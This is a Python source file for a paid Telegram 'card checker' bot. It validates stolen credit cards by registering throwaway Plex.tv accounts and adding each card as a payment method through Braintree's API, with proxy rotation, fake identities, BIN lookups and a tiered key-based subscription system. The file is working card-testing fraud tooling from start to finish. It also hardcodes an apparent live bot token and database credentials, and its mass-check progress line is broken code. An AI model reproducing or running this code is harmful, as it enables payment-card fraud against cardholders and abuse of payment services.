# b3_plex_final_working.py → FN B3 AUTH – PLEX.TV BRAINTEEE (FULL + 100% WORKING DEC 2025)
import asyncio
import logging
import os
import random
import string
import time
import re
import aiohttp
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import motor.motor_asyncio
import user_agent

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ========================= CONFIG =========================
TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '8009942983:AAEnjw_VFpvyb_0bjlb-93Yj3qRBxkGmISI')
OWNER_ID = 7593550190
MONGODB_URI = os.getenv('MONGODB_URI', 'mongodb+srv://ElectraOp:BGMI272@cluster0.1jmwb.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0')

client = motor.motor_asyncio.AsyncIOMotorClient(MONGODB_URI)
db = client['fn_mass_checker']
users = db['users']
keys = db['keys']

PROXY = True
try:
    with open('proxies.txt', 'r') as f:
        PROXY_LIST = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    PROXY_LIST = []

UA = user_agent.generate_user_agent()
TIERS = {'Gold': 500, 'Platinum': 1000, 'Owner': 3000}

check_queue = asyncio.Queue()
stop_checking = {}

# ===================== RANDOM DATA =====================
def gen_email(): return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + "@gmail.com"
def gen_pass(): return "SandeshThePapa@" + ''.join(random.choices(string.digits, k=4))
def gen_name():
    first = ["James","Emma","Michael","Olivia","William","Ava","John","Sophia","David","Isabella"]
    last = ["Smith","Johnson","Brown","Davis","Wilson","Moore","Taylor","Anderson","Thomas","Jackson"]
    return random.choice(first), random.choice(last)
def gen_postal(): return random.choice(["SW1A1AA","EC1A1BB","W1A0AA","M11AE","B33DQ","G11QE","CF101AA","LS11AA"])

# ===================== BIN INFO =====================
async def get_bin(bin_num):
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(f"https://bins.antipublic.cc/bins/{bin_num}") as r:
                if r.status == 200:
                    j = await r.json()
                    return (j.get('bank','Unknown'), j.get('brand','Unknown').capitalize(),
                            j.get('level','Unknown'), j.get('type','Unknown'),
                            j.get('country_name','Unknown'), j.get('country_flag',''))
    except: pass
    return "Unknown","Unknown","Unknown","Unknown","Unknown",""

async def test_proxy(p):
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get("https://www.google.com", proxy=p, timeout=6, ssl=False) as r:
                return r.status == 200
    except: return False

# ===================== MAIN CHECKER =====================
async def check_cc(cc_line):
    cc, mm, yy, cvv = [x.strip() for x in cc_line.split('|')]
    if len(mm) == 1: mm = "0" + mm
    if len(yy) == 2: yy = "20" + yy
    full = f"{cc}|{mm}|{yy}|{cvv}"

    bank, brand, level, typ, country, flag = await get_bin(cc[:6])
    email = gen_email()
    password = gen_pass()
    first, last = gen_name()
    postal = gen_postal()

    proxy = None
    proxy_status = "None"
    if PROXY and PROXY_LIST:
        proxy = random.choice(PROXY_LIST)
        if await test_proxy(proxy):
            proxy_status = "Live"
        else:
            proxy_status = "Dead"
            proxy = None
    proxies = {'http': proxy, 'https': proxy} if proxy else None

    start_time = time.time()
    try:
        async with aiohttp.ClientSession(headers={'user-agent': UA}, timeout=aiohttp.ClientTimeout(total=90)) as session:
            # 1. Register
            async with session.get("https://www.plex.tv/sign-up/") as r:
                html = await r.text()
            csrf = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', html)
            if not csrf: return {'status':'error', 'message':'CSRF not found', 'card':full}

            await session.post("https://www.plex.tv/sign-up/", data={
                'csrfmiddlewaretoken': csrf.group(1),
                'email': email,
                'password': password
            }, proxy=proxies['http'] if proxies else None)

            # 2. Get client token
            async with session.get("https://account.plex.tv/en-GB/payments/add", proxy=proxies['http'] if proxies else None) as r:
                html = await r.text()
            nonce = re.search(r'client_token_nonce":"([^"]+)', html)
            if not nonce: return {'status':'error', 'message':'Nonce missing', 'card':full}

            async with session.post("https://account.plex.tv/en-GB/payments/client-token",
                                    json={"nonce": nonce.group(1)}, proxy=proxies['http'] if proxies else None) as r:
                auth_fp = (await r.json())['clientToken']['authorizationFingerprint']

            # 3. Tokenize card
            headers = {
                'Authorization': f'Bearer {auth_fp}',
                'Braintree-Version': '2019-01-01',
                'Content-Type': 'application/json'
            }
            payload = {
                "clientSdkMetadata": {"source":"client","integration":"custom","sessionId":''.join(random.choices(string.ascii_letters+string.digits,k=32))},
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }",
                "variables": {"input": {
                    "creditCard": {"number": cc, "expirationMonth": mm, "expirationYear": yy, "cvv": cvv, "cardholderName": f"{first} {last}"},
                    "options": {"validate": False}
                }}
            }
            async with session.post("https://payments.braintree-api.com/graphql", headers=headers, json=payload, proxy=proxies['http'] if proxies else None) as r:
                data = await r.json()
                if 'errors' in data:
                    return {'status':'declined','message':data['errors'][0]['message'],'card':full}
                payment_nonce = data['data']['tokenizeCreditCard']['token']

            # 4. Add payment method
            final_payload = {
                "paymentMethodNonce": payment_nonce,
                "billingAddress": {"postalCode": postal, "countryCodeAlpha2": "GB"},
                "options": {"validate": False}
            }
            async with session.post("https://account.plex.tv/api/v2/paymentMethods", json=final_payload, proxy=proxies['http'] if proxies else None) as r:
                resp = await r.text()

            time_taken = round(time.time() - start_time, 2)

            if r.status in [200,201] or "success" in resp.lower():
                return {'status':'approved', 'message':'Payment method added!', 'card':full, 'time_taken':time_taken, 'proxy_status':proxy_status, 'bank':bank, 'brand':brand, 'level':level, 'type':typ, 'country':f"{country} {flag}"}
            elif any(x in resp.lower() for x in ["cvc","cvv","incorrect_cvc","security code"]):
                return {'status':'ccn', 'message':'Incorrect CVV', 'card':full, 'time_taken':time_taken, 'proxy_status':proxy_status, 'bank':bank, 'brand':brand, 'level':level, 'type':typ, 'country':f"{country} {flag}"}
            else:
                return {'status':'declined', 'message':resp[:80] or "Declined", 'card':full, 'time_taken':time_taken, 'proxy_status':proxy_status, 'bank':bank, 'brand':brand, 'level':level, 'type':typ, 'country':f"{country} {flag}"}

    except Exception as e:
        return {'status':'error', 'message':str(e)[:80], 'card':full, 'time_taken':round(time.time()-start_time,2), 'proxy_status':proxy_status}

# ===================== SEND RESULT =====================
async def send_result(update: Update, res: dict, uid: int, tier: str):
    icon = "Approved" if res['status']=='approved' else "CCN Approved" if res['status']=='ccn' else "Declined"
    text = f"""<b>{icon}</b>

<b>Card :</b> <code>{res['card']}</code>
<b>Gateway :</b> Plex.tv Braintree Auth
<b>Response :</b> {res['message']}

<b>Info :</b> {res['brand']} - {res['level']} - {res['type']}
<b>Bank :</b> {res['bank']}
<b>Country :</b> {res['country']}

<b>Time :</b> {res['time_taken']}s  <b>Proxy :</b> {res['proxy_status']}
<b>Checked By :</b> <a href="tg://user?id={uid}">{uid}</a> [{tier}]
<b>Bot :</b> <a href="tg://user?id=8009942983">FN B3 AUTH</a>"""
    await update.message.reply_text(text, parse_mode='HTML', disable_web_page_preview=True)

# ===================== COMMANDS =====================
async def start(update: Update, context):
    await update.message.reply_text("FN B3 AUTH – PLEX.TV LIVE DEC 2025\n\n/chk cc|mm|yy|cvv\nUpload .txt for mass\n/redeem <key>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Upload Combo", callback_data='up')]]))

async def chk(update: Update, context):
    user = await users.find_one({'user_id': update.message.from_user.id})
    if not user or user.get('expiration', datetime.min) < datetime.now():
        await update.message.reply_text("No subscription\n/redeem <key>")
        return
    if not context.args:
        await update.message.reply_text("Usage: /chk cc|mm|yy|cvv")
        return
    await check_queue.put((update.message.from_user.id, ' '.join(context.args), update, context))

async def handle_file(update: Update, context):
    user_id = update.message.from_user.id
    user = await users.find_one({'user_id': user_id})
    if not user or user.get('expiration', datetime.min) < datetime.now():
        await update.message.reply_text("No subscription")
        return

    file = await update.message.document.get_file()
    path = await file.download_to_drive()
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        ccs = [line.strip() for line in f if line.count('|') == 3]
    os.remove(path)

    if len(ccs) > user.get('cc_limit', 0):
        await update.message.reply_text(f"Limit exceed! Tier: {user['tier']} ({user['cc_limit']})")
        return

    stop_checking[user_id] = False
    msg = await update.message.reply_text("Starting mass check...")
    approved = 0
    hits = []

    for cc in ccs:
        if stop_checking.get(user_id):
            await msg.edit_text("Stopped by user")
            break
        res = await check_cc(cc)
        if res['status'] in ['approved','ccn']:
            approved += 1
            hits.append(res['card'])
            await send_result(update, res, user_id, user.get('tier','Free'))

        await msg.edit_text(f"<b>Checking...</b>\nApproved/CCN: {approved}\nChecked: {approved + len([c for c in ccs[:ccs.index(cc)+1] if await check_cc(c)['status'] not in ['approved','ccn']])}/{len(ccs)}\nLast: {res['message'][:40]}",
                            parse_mode='HTML',
                            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("STOP", callback_data='stop')]]))

    if hits:
        fn = f"plex_hits_{random.randint(1000,9999)}.txt"
        with open(fn,'w') as f: f.write('\n'.join(hits))
        with open(fn,'rb') as f:
            await context.bot.send_document(update.message.chat_id, f, caption=f"{len(hits)} Live Cards")
        os.remove(fn)

async def button(update: Update, context):
    q = update.callback_query
    await q.answer()
    if q.data == 'stop':
        stop_checking[q.from_user.id] = True
        await q.message.edit_text("Mass check stopped")

async def process_queue():
    while True:
        if not check_queue.empty():
            uid, cc, upd, ctx = await check_queue.get()
            res = await check_cc(cc)
            user = await users.find_one({'user_id': uid})
            await send_result(upd, res, uid, user.get('tier','Free') if user else 'Free')
        await asyncio.sleep(0.5)

# ===================== OWNER COMMANDS =====================
async def genkey(update: Update, context):
    if update.message.from_user.id != OWNER_ID: return await update.message.reply_text("Owner only")
    try:
        tier, dur, qty = context.args[0], context.args[1], int(context.args[2])
        days = int(''.join(filter(str.isdigit, dur)))
    except:
        return await update.message.reply_text("Usage: /genkey Gold 7d 10")
    gen = []
    for _ in range(qty):
        key = f"FN-B3-{''.join(random.choices(string.ascii_uppercase+string.digits,k=6))}-{''.join(random.choices(string.ascii_uppercase+string.digits,k=6))}"
        await keys.insert_one({'key':key,'tier':tier,'days':days,'used':False})
        gen.append(f"{key} → {tier} {days}d")
    await update.message.reply_text("Generated Keys:\n\n" + '\n'.join(gen))

async def redeem(update: Update, context):
    if not context.args: return await update.message.reply_text("/redeem <key>")
    k = await keys.find_one({'key':context.args[0],'used':False})
    if not k: return await update.message.reply_text("Invalid/used key")
    exp = datetime.now() + timedelta(days=k['days'])
    await users.update_one({'user_id':update.message.from_user.id},
                           {'$set':{'tier':k['tier'],'expiration':exp,'cc_limit':TIERS[k['tier']]}}, upsert=True)
    await keys.update_one({'key':context.args[0]},{'$set':{'used':True}})
    await update.message.reply_text(f"Redeemed {k['tier']} – Expires: {exp.strftime('%d %b %Y')}")

async def delkey(update: Update, context):
    if update.message.from_user.id != OWNER_ID: return
    try:
        uid = int(context.args[0])
        await users.update_one({'user_id':uid}, {'$unset':{'tier':'','expiration':'','cc_limit':''}})
        await update.message.reply_text(f"Removed subscription: {uid}")
    except:
        await update.message.reply_text("Usage: /delkey user_id")

# ===================== MAIN =====================
def main():
    app = Application.builder().token(TOKEN).build()
    
    # Sab handlers add karne ke baad
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(CommandHandler("genkey", genkey))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("delkey", delkey))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button))

    # Yeh line add kar de (yeh background queue chalayega)
    app.job_queue.run_once(lambda ctx: asyncio.create_task(process_queue()), 1)

    print("FN B3 AUTH – PLEX.TV LIVE & RUNNING")
    app.run_polling()
